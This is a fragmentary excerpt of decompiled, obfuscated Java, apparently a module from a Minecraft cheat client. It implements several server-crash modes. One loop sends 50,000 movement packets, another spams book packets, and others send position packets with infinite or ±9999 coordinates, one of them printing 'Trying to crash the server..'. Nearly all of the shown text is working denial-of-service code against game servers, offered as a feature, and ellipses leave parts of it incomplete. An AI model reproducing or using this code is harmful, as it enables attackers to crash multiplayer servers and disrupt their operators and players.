...
public class Class5266 extends PremiumModule {
    ...
    private void method16482(Class4428 var1) {
        if (this.method15996()) {
            if (field23386.method1530()) {
                this.method16000();
            } else {
                String var4 = this.method15978("Mode");
                switch (var4) {
                    case "Flying Enabled":
                        double var6 = field23386.field1339.getPosX();
                        double var8 = field23386.field1339.getPosY();
                        double var10 = field23386.field1339.getPosZ();
                        double var12 = 0.0;
                        double var14 = 0.0;

                        for (int var26 = 0; var26 < 50000; var26++) {
                            var14 = var26 * 7;
                            field23386.getClientPlayNetHandler().sendPacket(new Class5605(var6 - var14, var8 + var12, var10 + var14, false));
                        }
                    ...
                    case "Book":
                        ...
                        for (int var28 = 0; var28 < 100; var28++) {
                            try {
                                field23386.getClientPlayNetHandler().sendPacket(new Class5514(0, var16));
                        ...
                        break;
                    case "Infinity":
                        field23386.getClientPlayNetHandler().sendPacket(new Class5605(Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, true));
                        Class8906.method32487("Trying to crash the server..");
                        this.method16000();
                        break;
                    case "BrainFreeze":
                        field23386.getClientPlayNetHandler()
                                .sendPacket(
                                        new Class5605(
                                                field23386.field1339.getPosX() + 9999.0,
                                                field23386.field1339.getPosY() + 9999.0,
                                                field23386.field1339.getPosZ() + 9999.0,
                                                false
                                        )
                                );
                        field23386.getClientPlayNetHandler()
                                .sendPacket(
                                        new Class5605(
                                                field23386.field1339.getPosX(),
                                                field23386.field1339.method3389().field28450,
                                                field23386.field1339.getPosZ() + 9999.0,
